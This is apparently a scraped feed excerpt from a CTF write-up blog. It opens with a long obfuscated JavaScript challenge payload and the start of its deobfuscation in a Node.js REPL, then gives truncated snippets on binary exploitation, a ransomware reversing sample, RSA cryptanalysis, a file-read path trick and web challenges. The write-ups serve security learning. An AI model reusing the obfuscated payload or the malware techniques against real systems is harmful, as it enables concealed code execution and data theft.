_+HTB._$_+HTB.$__$+HTB._$_+HTB.$$_$+HTB.$__+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__$+HTB.$___+HTB.___+HTB.$$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$_+HTB.__$+HTB.$$_$+HTB.$__+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$__+HTB.$_$+HTB.__$+HTB.$___+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$$+HTB.$_$+HTB.$$$$+HTB.$__+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$_+"|\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.__+"\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+"|\\"+HTB.__$+HTB.$$$+HTB._$_+"|"+HTB.$$$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB.$$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.$__+HTB.$$$+HTB.$_$$+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$___+"|"+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB._$_+HTB.$__+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+"|"+HTB.__+HTB.$_$_+HTB.$_$$+(![]+"")[HTB._$_]+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$__+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+"|"+HTB._$+"\\"+HTB.__$+HTB.___+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+"|\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB._$+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$__$+HTB.$$__+HTB.$$__+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+"|"+HTB.$__+"\\"+HTB.__$+HTB.$_$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB.$$_+"|\\"+HTB.__$+HTB.___+HTB.$_$+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB._$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$_$+HTB.$__$+HTB.$$$_+HTB.$$$$+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$$_$+HTB.__$+HTB.$$_+HTB.$$$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$$+"|"+HTB.$_$$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$$$_+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$_$+HTB.$_$+HTB.$$$$+HTB._$_+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_$+"|"+HTB.$_$_+"|\\"+HTB.__$+HTB.$$_+HTB._$$+HTB.__+"\\"+HTB.__$+HTB.$$_+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB.__$+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"\\"+HTB.__$+HTB.$__+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+"|"+HTB.$_$_+HTB.$$_$+HTB.$__$+HTB.$__$+HTB.$$__+HTB.$$_+HTB.$$$$+HTB.___+HTB._$$+HTB.$__+HTB.$$_$+HTB.__$+HTB.$$$_+HTB.$_$_+HTB.__$+HTB.$$__+HTB.$___+HTB.___+HTB.$$_+HTB.$__$+HTB.$__+HTB.$$_+HTB.$_$_+HTB.$$__+HTB.$_$_+HTB.___+HTB.$$_$+HTB._$$+HTB.$$$+HTB.$$_$+HTB.$$$_+HTB.$_$+"|"+HTB.$$__+HTB.$__+HTB.$__$+HTB.$_$+HTB.___+HTB.$$__+HTB.$__+HTB.$__+HTB.$_$+HTB.$$__+HTB.$$$_+HTB.$$$+HTB.$$_+HTB.$$__+HTB.$___+HTB.___+HTB.$__$+HTB.___+HTB.$$__+HTB._$$+HTB.$__$+HTB._$$+HTB.___+HTB.__$+HTB.$$__+HTB.$_$$+HTB.$$_+HTB.$$$_+HTB.$_$_+HTB.$$_+HTB.__$+HTB.$$_$+"|"+HTB.$_$$+HTB.$$$+HTB.$_$_+HTB.___+HTB.$$_$+HTB.__$+HTB.___+HTB.$$_$+HTB.$$_$+HTB.$_$_+HTB.$_$+HTB.$___+HTB.$$$_+HTB.$$_$+HTB.__$+HTB._$$+HTB.$_$+HTB.$$_+HTB.__$+HTB.$$__+HTB.$$$_+HTB.$_$+HTB.$___+HTB.__$+HTB.___+HTB._$_+HTB.__$+HTB.$___+HTB.$$_$+HTB.$_$+HTB.$_$_+HTB.$__+"|\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB._$_+HTB._$$+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$$_+"|"+HTB.$_$$+HTB.__+HTB._$+HTB.$_$_+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB._$_+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$$+"|\\"+HTB.__$+HTB._$_+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB._+"\\"+HTB.__$+HTB.___+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.$_$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.___+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$_+HTB.$_$$+HTB.$___+"|"+HTB.$$_+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.___+"|\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$___+HTB.$$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+"|\\"+HTB.__$+HTB.$$$+HTB.___+"\\"+HTB.__$+HTB.$$_+HTB.___+"\\"+HTB.__$+HTB._$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__$+"|\\"+HTB.__$+HTB.___+HTB.$__+"\\"+HTB.__$+HTB.__$+HTB._$_+"\\"+HTB.__$+HTB.___+HTB._$_+"\\"+HTB.__$+HTB.$_$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$_$_+HTB.$$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.___+HTB.$_$$+"|\\"+HTB.__$+HTB.$_$+HTB.___+"\\"+HTB.__$+HTB.__$+HTB.$$$+"\\"+HTB.__$+HTB.__$+HTB.$__+HTB._$$+"|\\"+HTB.__$+HTB.___+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.__$+HTB.$$_+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$$_+"|"+HTB.$_$_+HTB.___+HTB._$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB.$$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB.$__+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.$_$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$_$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$_$+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+HTB.$$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB._$$+HTB.$_$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB._$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$$+HTB.$_$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$_$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$$$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$$+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+HTB.$$_+HTB._$_+"|\\"+HTB.__$+HTB.___+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.___+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$__+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$$+HTB.$$_+HTB._$$+"|\\"+HTB.__$+HTB.$$_+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$__+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$$+HTB.$_$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$__+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__+HTB.$_$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$$$$+"|"+HTB.___+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$__+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$$$_+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$$_$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$___+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$_+HTB.___+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.__$+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+HTB.$$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$_+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__$+HTB.$_$$+HTB.__$+HTB.$$$_+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+HTB.$$_+HTB._$$+HTB.$_$_+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$__+HTB.$_$$+HTB.$__+HTB.$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$__+HTB.$$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB._$_+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+HTB.$_$+HTB.$_$+HTB.$___+HTB.$$_$+"|"+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"|"+HTB.$__+HTB.$$$$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+"|\\"+HTB.__$+HTB._$$+HTB._$_+HTB._+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$__+"|"+HTB.__+HTB.$$_$+HTB.$$$_+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_+"|\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$_$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.$$$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB.$$$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$___+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$_$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_$+HTB.$__+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+HTB.$_$_+HTB.__+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.$_$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.$$__+HTB.$$_+"|"+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+"|\\"+HTB.__$+HTB.___+HTB._$_+HTB._$+HTB._$+(![]+"")[HTB._$_]+HTB.$$$_+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__$+HTB.$$$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.$$$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.___+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+"'.\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__+"('|'),"+HTB.___+",{}))\\"+HTB.__$+HTB._$_+"\"")())(); JavaScript deobfuscation The above code is very obfuscated. To start analyzing, we can find the first semi-colons and add newlines there:
HTB=~[]; HTB={___:++HTB,$$$$:(![]+"")[HTB],__$:++HTB,$_$_:(![]+"")[HTB],_$_:++HTB,$_$$:({}+"")[HTB],$$_$:(HTB[HTB]+"")[HTB],_$$:++HTB,$$$_:(!""+"")[HTB],$__:++HTB,$_$:++HTB,$$__:({}+"")[HTB],$$_:++HTB,$$$:++HTB,$___:++HTB,$__$:++HTB}; HTB.$_=(HTB.$_=HTB+"")[HTB.$_$]+(HTB._$=HTB.$_[HTB.__$])+(HTB.$$=(HTB.$+"")[HTB.__$])+((!HTB)+"")[HTB._$$]+(HTB.__=HTB.$_[HTB.$$_])+(HTB.$=(!""+"")[HTB.__$])+(HTB._=(!""+"")[HTB._$_])+HTB.$_[HTB.$_$]+HTB.__+HTB._$+HTB.$; HTB.$$=HTB.$+(!""+"")[HTB._$$]+HTB.__+HTB._+HTB.$+HTB.$$; HTB.$=(HTB.___)[HTB.$_][HTB.$_]; // ... First stage Using the Node.js REPL we can find out what are those sentences doing:
$ node Welcome to Node.js v20.0.0. Type ".help" for more information. &amp;gt; HTB=~[]; -1 &amp;gt; &amp;gt; HTB={___:++HTB,$$$$:(![]+"")[HTB],__$:++HTB,$_$_:(![]+"")[HTB],_$_:++HTB,$_$$:({}+"")[HTB],$$_$:(HTB[HTB]+"")[HTB],_$$:++HTB,$$$_:(!""+"")[HTB],$__:++HTB,$_$:++HTB,$$__:({}+"")[HTB],$$_:++HTB,$$$:++HTB,$___:++HTB,$__$:++HTB}; { ___: 0, '$$$$': 'f', '__$': 1, '$_$_': 'a', '_$_': 2, '$_$$': 'b', '$$_$': 'd', '_$$': 3, '$$$_': 'e', '$__': 4, '$_$': 5, '$$__': 'c', '$$_': 6, '$$$': 7, '$___': 8, '$__$': 9 } &amp;gt; &amp;gt; HTB.</description></item><item><title>Questionnaire</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/questionnaire/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/questionnaire/</guid><description>We are asked to answer these questions about binary exploitation:
$ nc 161.35.34.21 30758 This is a simple questionnaire to get started with the basics. ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉ ◉ ◉ When compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created. ◉ ◉ The flags added when compiling can affect the binary in various ways, like the protections. ◉ ◉ Another thing affected can be the architecture and the way it's linked.</description></item><item><title>Ransom</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/ransom/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/ransom/</guid><description>We have a Windows PE called windows_update.exe:
$ file windows_update.exe windows_update.exe: PE32+ executable (console) x86-64, for MS Windows Moreover, there is another file that looks encrypted from login.xlsx:
$ file login.xlsx.enc login.xlsx.enc: data Decompilation If we open the Windows PE in Ghidra, we will see this main function:
int __cdecl main(int _Argc, char **_Argv, char **_Env) { char *filename; __main(); if (_Argc == 1) { filename = "C:\\Users"; } else if (_Argc == 2) { filename = _Argv[1]; } else { printf("</description></item><item><title>Rather Secure Attachment</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/rather-secure-attachment/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/rather-secure-attachment/</guid><description>We are given the Python source code used to encrypt the flag:
from Crypto.Util.number import getPrime, bytes_to_long with open('flag.txt','rb') as f: m = bytes_to_long(f.read()) e = 0x10001 k = getPrime(4) l = getPrime(512) p = getPrime(512) q = getPrime(512) n = p*q c = pow(m, e, n) d = pow(2, k, n) f = pow(p, d, l) print(f"c = {c}") print(f"n = {n}") print(f"f = {f}") print(f"l = {l}") And the output of the above script:</description></item><item><title>readme 2023</title><link>https://7rocky.github.io/en/ctf/other/seccon-ctf/readme-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/seccon-ctf/readme-2023/</guid><description>We are provided with the Python source code that is running on the server:
import mmap import os import signal signal.alarm(60) try: f = open("./flag.txt", "r") mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ) except FileNotFoundError: print("[-] Flag does not exist") exit(1) while True: path = input("path: ") if 'flag.txt' in path: print("[-] Path not allowed") exit(1) elif 'fd' in path: print("[-] No more fd trick ;)") exit(1) with open(os.path.realpath(path), "rb") as f: print(f.</description></item><item><title>Rebuilding</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/rebuilding/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/rebuilding/</guid><description>We have a binary called rebuilding:
$ file rebuilding rebuilding: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7a145f3a4b213cf895a735e2b26adffc044c190, not stripped If we run it, it requires to use a command line argument:
$ ./rebuilding Preparing secret keys Missing required argument Let&amp;rsquo;s open it in Ghidra and decompile it. This is the main function:
undefined8 main(int argc, long argv) { int __c; size_t length; undefined8 ret; int checks; int i; int j; if (argc !</description></item><item><title>Red Island</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/red-island/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/red-island/</guid><description>We are given a website like this:
We can register a new account and then login to see this functionality:
This time we don&amp;rsquo;t have the source code for the web application, so we must find a clear vulnerability or get the source code somehow.
